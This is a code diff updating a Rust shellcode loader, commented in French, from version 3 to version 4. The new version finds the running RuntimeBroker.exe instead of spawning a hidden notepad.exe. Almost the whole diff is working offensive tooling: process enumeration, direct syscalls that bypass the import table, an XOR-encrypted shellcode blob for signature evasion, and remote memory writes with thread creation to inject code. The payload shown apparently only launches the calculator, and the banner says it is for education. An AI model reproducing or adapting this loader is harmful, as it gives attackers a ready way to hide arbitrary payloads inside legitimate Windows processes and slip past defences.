@@ -1,17 +1,17 @@
 /*
     ============================================================
-    🦀 CALC LOADER v3 - Process Injection + Full Syscalls
+    🦀 CALC LOADER v4 - Process Injection into RuntimeBroker.exe
     ============================================================
 
     Ce loader démontre les concepts suivants:
-    1. 100% Direct Syscalls (aucun appel kernel32/ntdll via IAT)
-    2. Process Injection dans notepad.exe (fenêtre cachée)
+    1. 100% Direct/Indirect Syscalls (aucun appel kernel32/ntdll via IAT)
+    2. Process Injection dans RuntimeBroker.exe (process existant)
     3. XOR encryption du shellcode (anti-signature)
     4. Protection mémoire RW→RX (pas de RWX!)
     5. Droits minimum (0x002A, pas PROCESS_ALL_ACCESS!)
 
-    Flow v3:
-    1. RtlInitUnicodeString + NtCreateUserProcess (spawner notepad)
+    Flow v4:
+    1. Énumération des processes pour trouver RuntimeBroker.exe
     2. NtOpenProcess avec droits minimum
     3. NtAllocateVirtualMemory (remote, RW)
     4. NtWriteVirtualMemory (full syscall!)
@@ -30,6 +30,8 @@ use std::ptr::null_mut;
 use winapi::ctypes::c_void;
 use winapi::shared::ntdef::{HANDLE, NTSTATUS, NULL, OBJECT_ATTRIBUTES};
 use winapi::shared::ntstatus::STATUS_SUCCESS;
+use winapi::um::handleapi::CloseHandle;
+use winapi::um::tlhelp32::*;
 
 // ============================================================
 // CONSTANTES MÉMOIRE
@@ -76,7 +78,7 @@ const ENCRYPTED_SHELLCODE: [u8; 276] = [
 ];
 
 // ============================================================
-// STRUCTURES POUR NtOpenProcess / NtCreateUserProcess
+// STRUCTURES POUR NtOpenProcess
 // ============================================================
 #[repr(C)]
 struct ClientId {
@@ -95,56 +97,38 @@ fn xor_decrypt(encrypted: &[u8], key: &[u8]) -> Vec<u8> {
         .collect()
 }
 
-/// Spawns notepad.exe (hidden window) and returns process handle + PID
-/// Note: CreateProcessW is used here because NtCreateUserProcess requires ~20 complex
-/// structures (RTL_USER_PROCESS_PARAMETERS, PS_CREATE_INFO, PS_ATTRIBUTE_LIST, etc.)
-/// The real educational value is in the injection using full syscalls.
-fn spawn_notepad_syscall() -> Result<(HANDLE, u32), String> {
+/// Trouve le PID d'un processus par son nom
+fn find_process_pid(target_name: &str) -> Option<u32> {
     unsafe {
-        use winapi::um::processthreadsapi::{CreateProcessW, PROCESS_INFORMATION, STARTUPINFOW};
-        use winapi::um::winbase::CREATE_NO_WINDOW;
-
-        let mut si: STARTUPINFOW = zeroed();
-        si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
-
-        let mut pi: PROCESS_INFORMATION = zeroed();
-
-        let cmd: Vec<u16> = "C:\\Windows\\System32\\notepad.exe\0"
-            .encode_utf16()
-            .collect();
-
-        let success = CreateProcessW(
-            null_mut(),
-            cmd.as_ptr() as *mut _,
-            null_mut(),
-            null_mut(),
-            0,
-            CREATE_NO_WINDOW,
-            null_mut(),
-            null_mut(),
-            &mut si,
-            &mut pi,
-        );
-
-        if success == 0 {
-            return Err("CreateProcessW failed".to_string());
+        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if snapshot == winapi::um::handleapi::INVALID_HANDLE_VALUE {
+            return None;
         }
 
-        let pid = pi.dwProcessId;
+        let mut entry: PROCESSENTRY32W = zeroed();
+        entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
 
-        // Fermer le handle thread avec NtClose (syscall!)
-        let status: NTSTATUS = syscall!("NtClose", pi.hThread);
-        if status != STATUS_SUCCESS {
-            println!("[!] NtClose(thread) warning: {:#X}", status);
+        if Process32FirstW(snapshot, &mut entry) != 0 {
+            loop {
+                // Convertir le nom du process en String
+                let name = String::from_utf16_lossy(&entry.szExeFile)
+                    .trim_end_matches('\0')
+                    .to_lowercase();
+
+                if name == target_name.to_lowercase() {
+                    let pid = entry.th32ProcessID;
+                    CloseHandle(snapshot);
+                    return Some(pid);
+                }
+
+                if Process32NextW(snapshot, &mut entry) == 0 {
+                    break;
+                }
+            }
         }
 
-        // Fermer le handle process aussi (on va le réouvrir avec droits minimum)
-        let status: NTSTATUS = syscall!("NtClose", pi.hProcess);
-        if status != STATUS_SUCCESS {
-            println!("[!] NtClose(process) warning: {:#X}", status);
-        }
-
-        Ok((null_mut(), pid)) // On retourne juste le PID, on réouvre après
+        CloseHandle(snapshot);
+        None
     }
 }
 
@@ -307,7 +291,7 @@ fn inject_shellcode(target_pid: u32, encrypted_shellcode: &[u8]) -> Result<(), S
         }
 
         println!("[+] Remote thread created: {:p}", thread_handle);
-        println!("[+] Shellcode executing in notepad.exe!");
+        println!("[+] Shellcode executing in RuntimeBroker.exe!");
 
         // =====================================================
         // ÉTAPE 7: NtClose (cleanup avec syscalls!)
@@ -328,46 +312,44 @@ fn main() {
     println!(
         r#"
     ╔═══════════════════════════════════════════════════════════╗
-    ║  🦀 CALC LOADER v3 - Process Injection Edition 🦀        ║
+    ║  🦀 CALC LOADER v4 - RuntimeBroker.exe Injection Edition 🦀    ║
     ║                                                           ║
     ║  Techniques:                                              ║
-    ║  ✓ Process injection into notepad.exe                     ║
-    ║  ✓ Full syscalls (NtWriteVirtualMemory, NtClose)          ║
-    ║  ✓ Minimum rights (0x002A, not PROCESS_ALL_ACCESS!)       ║
-    ║  ✓ XOR encrypted shellcode                                ║
-    ║  ✓ RW → RX memory protection                              ║
+    ║  ✓ Process injection into existing RuntimeBroker.exe           ║
+    ║  ✓ Full syscalls (NtWriteVirtualMemory, NtClose)         ║
+    ║  ✓ Minimum rights (0x002A, not PROCESS_ALL_ACCESS!)      ║
+    ║  ✓ XOR encrypted shellcode                               ║
+    ║  ✓ RW → RX memory protection                             ║
     ║                                                           ║
     ║  Syscalls used:                                           ║
-    ║  • NtOpenProcess        • NtProtectVirtualMemory          ║
-    ║  • NtAllocateVirtualMemory  • NtCreateThreadEx            ║
-    ║  • NtWriteVirtualMemory     • NtClose                     ║
+    ║  • NtOpenProcess        • NtProtectVirtualMemory         ║
+    ║  • NtAllocateVirtualMemory  • NtCreateThreadEx           ║
+    ║  • NtWriteVirtualMemory     • NtClose                    ║
     ║                                                           ║
     ║  ⚠️  FOR EDUCATIONAL PURPOSES ONLY                        ║
     ╚═══════════════════════════════════════════════════════════╝
     "#
     );
 
-    // Étape 1: Lancer notepad.exe (fenêtre cachée)
-    println!("[*] Spawning notepad.exe (hidden window)...");
+    // Étape 1: Trouver RuntimeBroker.exe
+    println!("[*] Searching for RuntimeBroker.exe...");
 
-    let (_, pid) = match spawn_notepad_syscall() {
-        Ok(result) => result,
-        Err(e) => {
-            eprintln!("[✗] Failed to spawn notepad: {}", e);
+    let pid = match find_process_pid("RuntimeBroker.exe") {
+        Some(pid) => pid,
+        None => {
+            eprintln!("[✗] RuntimeBroker.exe not found!");
+            eprintln!("[*] Tip: Open a folder with thumbnails to spawn RuntimeBroker.exe");
             std::process::exit(1);
         }
     };
 
-    println!("[+] Notepad spawned with PID: {}", pid);
-
-    // Petite pause pour laisser notepad s'initialiser
-    std::thread::sleep(std::time::Duration::from_millis(500));
+    println!("[+] Found RuntimeBroker.exe with PID: {}", pid);
 
     // Étape 2: Injecter le shellcode
     match inject_shellcode(pid, &ENCRYPTED_SHELLCODE) {
         Ok(_) => {
             println!("\n════════════════════════════════════════════");
-            println!("[✓] SUCCESS: Calc launched from notepad.exe!");
+            println!("[✓] SUCCESS: Calc launched from RuntimeBroker.exe!");
             println!("════════════════════════════════════════════");
         }
         Err(e) => {
